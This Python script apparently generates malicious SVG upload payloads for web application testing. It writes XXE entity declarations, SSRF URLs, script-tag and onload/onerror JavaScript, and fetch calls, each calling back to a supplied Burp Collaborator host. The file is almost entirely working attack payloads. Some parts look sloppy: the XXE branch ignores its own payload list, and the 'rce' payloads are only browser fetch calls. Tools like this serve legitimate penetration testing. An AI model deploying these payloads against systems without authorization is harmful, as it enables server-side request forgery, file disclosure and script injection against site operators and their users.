from pathlib import Path

def generate_svg_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'ssrf': [
            f"http://{burp_collab}/ssrf1",
            f"https://{burp_collab}/ssrf2",
            f"http://127.0.0.1@{burp_collab}/ssrf3",
        ],
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
            f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
        ],
        'rce': [
            f"fetch('http://{burp_collab}/rce1')",
            f"XMLHttpRequest().open('GET','http://{burp_collab}/rce2')",
        ],
        'xss': [
            f"<script>fetch('http://{burp_collab}/xss1')</script>",
            f"<img src=x onerror=fetch('http://{burp_collab}/xss2')>",
            f"<svg onload=fetch('http://{burp_collab}/xss3')>",
        ],
    }
    
    for vuln, payloads in vulns.items():
        vuln_dir = output_dir / vuln
        vuln_dir.mkdir(exist_ok=True)
        
        if vuln == 'ssrf':
            svg_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text>&xxe;</text>
</svg>'''
            for i, payload in enumerate(payloads, 1):
                svg_content = svg_template.format(payload)
                output_file = vuln_dir / f"payload_{i}.svg"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(svg_content)
        
        elif vuln == 'xxe':
            svg_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "http://{}/xxe{}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text>&xxe;</text>
</svg>'''
            for i, payload in enumerate(payloads, 1):
                svg_content = svg_template.format(burp_collab, i)
                output_file = vuln_dir / f"payload_{i}.svg"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(svg_content)
        
        elif vuln == 'rce':
            svg_template = '''<svg xmlns="http://www.w3.org/2000/svg" onload="{}">
<rect width="100" height="100" fill="red"/>
</svg>'''
            for i, payload in enumerate(payloads, 1):
                svg_content = svg_template.format(payload)
                output_file = vuln_dir / f"payload_{i}.svg"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(svg_content)
            
            svg_script_template = '''<svg xmlns="http://www.w3.org/2000/svg">
<script>
{}
</script>
<rect width="100" height="100" fill="blue"/>
</svg>'''
            for i, payload in enumerate(payloads, 1):
                svg_content = svg_script_template.format(payload)
                output_file = vuln_dir / f"script_{i}.svg"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(svg_content)
        
        elif vuln == 'xss':
            for i, payload in enumerate(payloads, 1):
                svg_content = f'''<svg xmlns="http://www.w3.org/2000/svg">
{payload}
<rect width="100" height="100" fill="green"/>
</svg>'''
                output_file = vuln_dir / f"payload_{i}.svg"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(svg_content)

